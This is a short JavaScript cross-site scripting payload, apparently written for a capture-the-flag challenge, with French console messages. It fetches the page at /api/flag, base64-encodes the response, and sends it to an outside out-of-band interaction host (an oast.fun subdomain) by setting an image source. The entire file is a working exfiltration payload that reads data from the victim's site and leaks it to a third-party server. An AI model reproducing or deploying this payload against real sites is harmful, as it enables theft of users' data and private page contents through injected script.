(function () {
    console.log('[XSS] Script démarré');

    try {
        fetch('/api/flag')
            .then(function (res) {
                console.log('[XSS] Requête GET /api/flag réussie');
                return res.text();
            })
            .then(function (html) {
                console.log('[XSS] HTML reçu :', html);

                const b64 = btoa(html);
                console.log('[XSS] Encodé en base64 :', b64);

                const url = 'http://kwzvnipoylejwhfgszax4idsmvlc0jrjt.oast.fun/?exfil=' + encodeURIComponent(b64);
                console.log('[XSS] Envoi vers webhook :', url);

                const i = new Image();
                i.src = url;
            })
            .catch(function (err) {
                console.error('[XSS] Erreur lors du fetch ou de l\'exfiltration :', err);
            });
    } catch (err) {
        console.error('[XSS] Erreur globale :', err);
    }
})();
